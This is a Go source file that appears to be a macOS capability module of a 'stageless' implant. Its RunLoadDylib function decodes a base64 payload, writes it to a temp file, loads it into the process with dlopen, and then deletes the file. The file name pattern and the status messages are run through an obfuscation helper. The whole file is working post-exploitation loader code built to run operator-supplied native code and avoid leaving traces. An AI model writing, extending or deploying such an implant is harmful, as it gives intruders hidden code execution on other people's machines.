//go:build darwin

package capabilities

import (
	"encoding/base64"
	"os"
	"syscall"
	"unsafe"

	"stageless/utils/obf"
)

const rtlDNow = 2

var libc_dlopen_trampoline_addr uintptr
//go:cgo_import_dynamic libc_dlopen dlopen "/usr/lib/libSystem.B.dylib"
var libc_dlclose_trampoline_addr uintptr
//go:cgo_import_dynamic libc_dlclose dlclose "/usr/lib/libSystem.B.dylib"
var libc_dlerror_trampoline_addr uintptr
//go:cgo_import_dynamic libc_dlerror dlerror "/usr/lib/libSystem.B.dylib"

func dlopenPath(path string, mode int) uintptr {
	// Opens a dylib at the given path and returns the handle
	p, err := syscall.BytePtrFromString(path)
	if err != nil {
		return 0
	}
	r0, _, _ := syscall.Syscall(libc_dlopen_trampoline_addr, uintptr(unsafe.Pointer(p)), uintptr(mode), 0)
	return r0
}

func dlcloseHandle(handle uintptr) {
	// Closes the given dylib handle
	_, _, _ = syscall.Syscall(libc_dlclose_trampoline_addr, handle, 0, 0)
}

func dlerrorString() string {
	// Reads the last loader error string
	r0, _, _ := syscall.Syscall(libc_dlerror_trampoline_addr, 0, 0, 0)
	return cStringAt(r0)
}

func cStringAt(ptr uintptr) string {
	// Reads a C string from the given pointer
	if ptr == 0 {
		return ""
	}
	b := make([]byte, 0, 128)
	for i := 0; i < 4096; i++ {
		c := *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
		if c == 0 {
			break
		}
		b = append(b, c)
	}
	return string(b)
}

func mapDylibFromBytes(payload []byte) uintptr {
	// Writes the payload to a temp file and loads the dylib
	if len(payload) == 0 {
		return 0
	}
	f, err := os.CreateTemp("", obf.S("ld-*.dylib"))
	if err != nil {
		return 0
	}
	path := f.Name()
	ok := false
	defer func() {
		// Closes the temp file and removes it when the load did not succeed
		_ = f.Close()
		if !ok {
			_ = os.Remove(path)
		}
	}()
	if _, err := f.Write(payload); err != nil {
		return 0
	}
	if err := f.Close(); err != nil {
		return 0
	}
	handle := dlopenPath(path, rtlDNow)
	_ = os.Remove(path)
	if handle == 0 {
		return 0
	}
	ok = true
	return handle
}

func RunLoadDylib(input, params string) []byte {
	// Main function that decodes the payload and loads the dylib
	payload, err := base64.StdEncoding.DecodeString(input)
	if err != nil || len(payload) == 0 {
		return WriteMsg(obf.S("Error: empty or invalid DYLIB input"))
	}
	handle := mapDylibFromBytes(payload)
	if handle == 0 {
		if msg := dlerrorString(); msg != "" {
			return WriteMsg(obf.S("Error: dlopen failed: ") + msg)
		}
		return WriteMsg(obf.S("Error: failed to load DYLIB"))
	}
	dlcloseHandle(handle)
	return WriteMsg(obf.S("DYLIB loaded."))
}
